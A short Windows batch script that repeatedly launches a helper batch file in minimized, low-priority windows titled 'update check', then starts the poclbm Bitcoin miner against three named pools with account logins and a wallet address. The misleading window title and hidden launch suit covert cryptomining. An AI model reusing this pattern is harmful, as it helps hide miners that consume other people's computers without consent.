cd %homedrive%\guiminer

set i=%1

if ("%i%")==("") set i=1

del stop.txt

:for

start "update check" /MIN /LOW cmd /C C:\guiminer\open.bat %i%
set /A i+=1
if not exist stop.txt goto for

del stop.txt

"%homedrive%\guiminer\poclbm.exe" -q evanmcc_aoe:1@stratum.btcguild.com:3333#btcguild evanmcc:d=1@mmpool.bitparking.com:3333#bitparking 1GPwFQ51uzwx1TuE4rYNo2VFahYvJKjw1c:1@stratum.mining.eligius.st:3334#eligus